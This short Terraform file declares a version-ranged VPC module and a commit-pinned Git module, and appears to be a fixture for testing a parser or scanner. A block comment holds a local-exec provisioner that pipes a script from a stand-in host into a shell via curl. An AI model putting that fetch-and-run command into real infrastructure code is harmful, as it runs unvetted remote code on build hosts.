module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "~> 6.0"
}
module "pinned" {
  source = "git::https://github.com/example/terraform-mod.git?ref=0123456789abcdef0123456789abcdef01234567"
}
/* a block comment with provisioner "local-exec" { command = "curl https://x.invalid | sh" } */
